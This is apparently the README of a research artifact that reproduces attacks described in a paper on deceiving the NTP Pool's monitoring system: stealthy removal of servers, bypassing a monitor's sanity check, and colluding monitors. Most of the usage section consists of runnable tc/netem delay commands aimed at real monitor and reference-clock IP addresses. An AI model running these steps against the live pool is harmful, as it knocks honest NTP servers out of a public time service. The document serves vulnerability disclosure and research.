# NTP_monitor_exp_Eatwatchdog

1. Paper Name : Did the Shark Eat the Watchdog in the NTP Pool? Deceiving the NTP Pool’s Monitoring System

2. Paper Description
This paper shows three ways to experimentally reproduce the vulnerabilities of the NTP Pool monitoring system we have identified. A rough description of each experiment is as follows.

2-1) Stealthy Attack for to make NTP servers disappear from the pool.
Assume that the attacker wants to remove the NTP server from the pool, but does not want to notify the NTP server owner.
An attacker assigns Adaptive one-way-Delay while viewing the NTP server and the score log of the NTP server.
This is to exploit the phenomenon that the score is maintained when a specific NTP server is scored as Offset.
At this time, it is possible to create a phenomenon that does not appear in the NTP Pool without being noticed by the NTP Server owner.

2-2) Bypassing the monitoring station’s Sanity Check and skewing the NTP server’s score.
The Reference Clock for Sanity Check of Monitoring Station is hard-coded.
If an attacker adds one-way-delay to the monitoring station’s local clock and the reference clock for sanity check at the same time, it can violate the sanity check of the monitor server (the server that aggregates and evaluates scores).
The victim monitoring station can then lower the score by evaluating the NTP servers with a skewed offset.

2-3) Malicious consensus of Multi Monitoring stations.
The Beta Site operates a Monitoring System based on Multiple Monitoring Stations.
If this monitoring system is also applied to the official site, it seems good to restrict the subscription conditions of the monitoring station.
If an attacker secures many monitoring station qualifications with more than one account, the monitoring timing can be matched by analyzing the scoring cycle of the NTP server.
In this case, an attacker can take advantage of their monitoring stations to quickly lower the score of the NTP server.
If an attacker intentionally fails the monitoring station’s sanity check, the server’s scoring period can be changed every 2 minutes.

3. Installation Guide

3-1) Software for execution
- tc(Traffic Control)
- nodeJS
- ntpd
- ntppool-monitor : Even if you install this software, you need to obtain an authentication key to run the software. Therefore, Experiment 2 and Experiment 3 should participate in the monitor beta tester or configure the virtual environment through Kubernetes before conducting the experiment.

3-2) Web page for observation of experiment results
web page : https://web.beta.grundclock.com/en/
* The experimenter can check the logs and graphs of the NTP server registered in the NTP Pool, and the activity status of the monitor.

4. Usage
/* All experimental results can be found in the Score log and graph of the Victim NTP server. */

4-1) Experiment 1
* tc command : If you are familiar with the 'tc' command, you can properly categorize the interface or class.

sudo tc qdisc add dev {nw_interface1} root handle 1: prio
sudo tc qdisc add dev {nw_interface1} parent 1:3 handle 30: netem delay 50ms 20ms // 50ms & 20ms is optional value for network delay
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 139.178.70.122 flowid 1:3 // '139.178.70.122' is monitor's IP. You can easily find the monitor IP corresponding to the NTP Pool domain with the 'nslookup' command.

* Node.js command:
node exp1_calcalphabeta.js
// The IP value of the variable "resp_URL" must be changed to continuously check the score of the NTP server being attacked.

* Restore: Delete the tc interface

sudo tc qdisc del dev {nw_interface1} root

4-2) Experiment 2
* Add delay to all outbound traffic of the monitor

sudo tc qdisc add dev {nw_interface1} root netem delay 500ms 20ms

* Add delay only to the top stratum of the monitor

sudo tc qdisc add dev {nw_interface1} root handle 1: prio
sudo tc qdisc add dev {nw_interface1} parent 1:3 handle 30: netem delay 10ms 4ms
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst {upper_stratum_NTP_server_IP} flowid 1:3 // 'upper_stratum_NTP_server_IP' is an NTP server on the upper stratum of the monitor. If the monitor also serves as an NTP server, you can check what the top NTP server is with the 'ntpd' command or the 'ntpdate' command.

* Avoiding Sanity Check : Each IP refers to the IP returned from the domain address that is hard-coded in the monitor source code, and if the domain name is changed or the IP is changed, the IP list to be entered must be changed to suit the experimental environment.

sudo tc qdisc add dev {nw_interface1} root handle 1: prio
sudo tc qdisc add dev {nw_interface1} parent 1:3 handle 30: netem delay 500ms
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.68.125 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 61.205.120.130 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.26.125 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 169.229.128.134 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 164.67.62.199 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.54.253 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.34.125 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 130.133.1.10 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 193.162.159.194 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 192.36.143.234 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 193.0.0.229 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 17.253.114.125 flowid 1:3
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst 118.220.200.235 flowid 1:3

* Excute script
node exp2_sandm.js
// The IPs stored in the 'beta_NTP_servers' variable are a list of NTP servers found on the beta site and as of July 2022.

* Restore: Delete the tc interface

sudo tc qdisc del dev {nw_interface1} root

4-3) Experiment 3
// In order to reproduce this experiment, it is necessary to be able to control at least two monitors.

* Region 1 Monitor
sudo tc qdisc add dev {nw_interface1} root handle 1: prio
sudo tc qdisc add dev {nw_interface1} parent 1:3 handle 30: netem delay 500ms
sudo tc filter add dev {nw_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst {Victim NTP Server} flowid 1:3

* Region 2 Monitor
sudo tc qdisc add dev {nw2_interface1} root handle 1: prio
sudo tc qdisc add dev {nw2_interface1} parent 1:3 handle 30: netem delay 500ms
sudo tc filter add dev {nw2_interface1} protocol ip parent 1:0 prio 3 u32 match ip dst {Victim NTP Server} flowid 1:3

* Delete the tc interface
** Region 1 Monitor
sudo tc qdisc del dev {nw_interface1} root
** Region 2 Monitor
sudo tc qdisc del dev {nw2_interface1} root

5. Development Environment
5-1) System Specifications
The Xeon server desktop (Intel® Xeon® CPU ES-2620 v4 2.10 GHz 16 cores, 256 GB RAM),
Ubuntu 20.04 Server

6. Contributing
Improved code and bug reporting are welcome. You can contribute directly to GitHub, or contact the code author by mail.
Code Author Email:
1) jgsong@isslab.korea.ac.kr
2) newshok@naver.com

7. License


8. Copyright
